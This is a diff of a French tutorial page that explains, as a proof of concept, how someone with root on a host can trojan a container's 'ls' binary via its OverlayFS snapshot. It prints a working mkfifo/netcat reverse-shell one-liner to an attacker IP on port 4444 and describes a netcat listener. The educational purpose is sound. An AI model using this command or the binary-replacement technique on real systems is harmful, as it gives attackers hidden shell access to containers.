@@ -51,49 +51,51 @@
         <h2>3. Anatomie d'une attaque (Proof of Concept)</h2>
         <p>Passons à la pratique. L'objectif ici est de transformer une commande banale (<code>ls</code>) en un vecteur de connexion pour l'attaquant.</p>
 
-        <h3>Étape 1 : Préparation de l'écouteur</h3>
+        <p>Côté attaquant : On prépare un listener netcat sur le port 4444 :</p>
+
         <figure>
           <img src="images/a_lp_1.png" alt="Netcat listener setup" />
         </figure>
 
-        <p>Côté attaquant : On prépare un listener netcat sur le port 4444.</p>
+        <p>On lance deux conteneurs Alpine classiques. Pour l'expérience, on suppose qu'on a déjà un accès root sur l'hôte. Notre but est de trouver où ces conteneurs "vivent" physiquement.</p>
 
-        <h3>Étape 2 : Identification de la cible sur l'hôte</h3>
         <figure>
           <img src="images/v_lp_1.png" alt="Starting Alpine containers" />
         </figure>
-        <p>
-          On lance deux conteneurs Alpine classiques. Pour l'expérience, on suppose qu'on a déjà un accès root sur l'hôte. Notre but est de trouver où ces conteneurs "vivent" physiquement.
-        </p>
+
+        <p>Notre but est de trouver où ces conteneurs "vivent" physiquement.</p>
+
         <figure>
           <img src="images/v_lp_2.png" alt="Inspecting container and overlayfs mount" />
         </figure>
 
         <p>Ici, on identifie le point de montage OverlayFS associé au conteneur.</p>
 
-        <h3>Étape 3 : Injection du poison</h3>
+        <p>Une fois dans le snapshot (ici le n°49), on a accès à l'arborescence complète du conteneur (<code>/bin</code>, <code>/etc</code>, etc.). C'est ici qu'on va agir.</p>
+
         <figure>
           <img src="images/v_lp_3.png" alt="Exploring the snapshot" />
         </figure>
-        <p>
-          Une fois dans le snapshot (ici le n°49), on a accès à l'arborescence complète du conteneur (<code>/bin</code>, <code>/etc</code>, etc.). C'est ici qu'on va agir.
-        </p>
+        
+       <p>On remplace le binaire <code>ls</code> par un script malveillant :</p>
+
         <figure>
           <img src="images/v_lp_4.png" alt="Modifying ls binary" />
         </figure>
-        <p>
-          On remplace le binaire <code>ls</code> par un script malveillant. Ce script fait deux choses :
+
+        <p>Ce script fait deux choses :
           1. Il lance un <strong>Reverse Shell</strong> en arrière-plan vers l'IP de l'attaquant.
           2. Il appelle le vrai binaire <code>ls</code> pour que l'utilisateur ne remarque rien.
         </p>
         <pre><code>(mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f &) > /dev/null 2>&1</code></pre>
 
-        <h3>Étape 4 : Le "Pop" du Shell</h3>
+        <p>L'utilisateur exécute la commande <code>ls /etc</code>. 
+        
         <figure>
           <img src="images/v_lp_5.png" alt="Victim executing ls" />
         </figure>
 
-        <p>L'utilisateur exécute la commande <code>ls /etc</code>. L'affichage est normal, l'illusion est parfaite.</p>
+        <p>L'affichage est normal, l'illusion est parfaite.</p>
 
         <figure>
           <img src="images/a_lp_2.png" alt="Attacker receiving access" />
